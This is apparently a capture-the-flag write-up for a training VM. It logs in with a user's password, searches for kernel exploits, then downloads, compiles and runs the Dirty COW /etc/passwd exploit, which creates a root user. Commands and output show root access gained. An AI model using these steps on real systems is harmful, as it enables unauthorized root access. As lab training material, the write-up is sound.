# Writeup2

The first step it to use the credentials of laurie which we got in writeup1.md.

ssh laurie@172.16.129.137
password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

Then we check the version of the linux kernel with :

```
uname -r
```

output : 3.2.0-91-generic-pae

Kernel version is 3.2.

Using searchsploit on the host machine, we check the possible vulnerabilites of the 3.2 version.


```
searchsploit linux kernel 3.2.0-91
```

output :

------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation | solaris/local/15962.c


Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method) | linux/local/40616.c

Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method) | linux/local/40847.cpp

Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method) | linux/local/40838.c

Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) | linux/local/40839.c

Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method) | linux/local/40611.c

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1) | linux/local/18411.c

Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper' Local Privilege Escalation (2) | linux/local/35161.c

Linux Kernel 3.0 < 3.3.5 - 'CLONE_NEWUSER|CLONE_FS' Local Privilege Escalation | linux/local/38390.c

Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation | linux_x86-64/local/33516.c

Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free | linux/dos/43234.c

Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation | linux/local/41886.c

Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation | linux/local/34923.c

Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation | linux_x86-64/local/44302.c

Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation | arm/local/31574.c

Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation | linux_x86-64/local/44299.c

Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2) | linux_x86-64/local/26131.c

Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege Escalation | linux/local/25450.c

Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service | linux/dos/42136.c

Linux kernel < 4.10.15 - Race Condition Privilege Escalation | linux/local/43345.c

Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation | linux/local/45553.c

Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC) | linux/dos/42762.txt

Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c

Linux Kernel < 4.14.rc3 - Local Denial of Service | linux/dos/42932.c

Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak | linux/local/44325.c

Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption | linux/dos/44832.txt

Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free | linux/dos/44579.c

Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation | linux_x86-64/local/44300.c

Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP) | linux/local/43418.c

Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP) | linux/local/47169.c

Linux Kernel < 4.5.1 - Off-By-One (PoC) | linux/dos/44301.c

------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------

We chose the Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) exploit.

searchsploit is a tool used to find exploits available on https://www.exploit-db.com, the output Name is the same as the one on the website.

We filter by name and find it : https://www.exploit-db.com/exploits/40839

Let's copy the content of the code inside a new C programming file, diry_cow.c :

```
wget --no-check-certificate https://www.exploit-db.com/download/40839 -O dirty_cow.c
```

Comments inside dirty_cow.c explain how to compile and run the binary :

Compile with:
```
 gcc -pthread dirty.c -o dirty -lcrypt
```

Then run the newly create binary by either doing:
```
  ./dirty or ./dirty my-new-password
```

Doing as instructed :

```
./dirty
```

output :
  /etc/passwd successfully backed up to /tmp/passwd.bak
  Please enter the new password:

Let's use the character 'q' as new password.

output :

Complete line:
firefart:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash

mmap: b7fda000


Terminating the program with ^C, we identify as the new user and provide the newly created password :

```
su firefart
```
password : q

We see we changed user :
firefart@BornToSecHackMe:/home/laurie#

```
whoami
```
output:
firefart

Let's confirm we have escalated to root and succeeded :

```
id
```
output:
uid=0(firefart) gid=0(root) groups=0(root)

